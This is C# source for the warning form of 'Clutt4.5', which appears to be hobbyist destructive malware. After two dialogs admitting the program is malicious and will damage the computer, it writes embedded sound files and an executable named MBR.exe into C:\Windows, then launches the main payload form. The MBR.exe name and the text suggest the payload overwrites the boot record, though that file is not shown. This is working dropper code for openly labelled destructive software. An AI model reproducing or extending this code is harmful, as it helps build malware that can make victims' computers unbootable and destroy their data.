using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Clutt4._5
{
    public partial class warn : Form
    {
        public warn()
        {
            InitializeComponent();
            TransparencyKey = BackColor;
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private void warn_Load(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you want to run this program?" + Environment.NewLine + "This is malicious software!" + Environment.NewLine + "" + Environment.NewLine + "Click Yes to continue", "Clutt4.5", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Environment.Exit(-1);
            }
            else
            {
                Last_Warning();
            }
        }

        public void Last_Warning()
        {
            if (MessageBox.Show("THIS IS THE LAST WARNING!!!" + Environment.NewLine + "IF YOU RUN THE PROGRAM, YOUR COMPUTER WILL RECEIVE LARGE DAMAGE AND YOU WILL HAVE TO REINSTALL IT!" + Environment.NewLine + "" + Environment.NewLine + "DO YOU REALLY WANT TO RUN THIS DANGEROUS PROGRAM!?", "Clutt4.5", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Environment.Exit(-1);
            }
            else
            {
                Extract("Clutt4._5", "C:\\Windows", "Resources", "colorpcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "darkpcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "glitch2pcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "glitch3pcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "glitch4pcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "glitch5pcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "glitchpcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "lightpcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "rainbowpcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "scrasepcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "shakepcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "tunelpcm.wav");
                Extract("Clutt4._5", "C:\\Windows", "Resources", "MBR.exe");
                run_clutt();
            }
        }

        public void run_clutt()
        {
            this.Hide();
            var NewForm = new Clutt4_5();
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
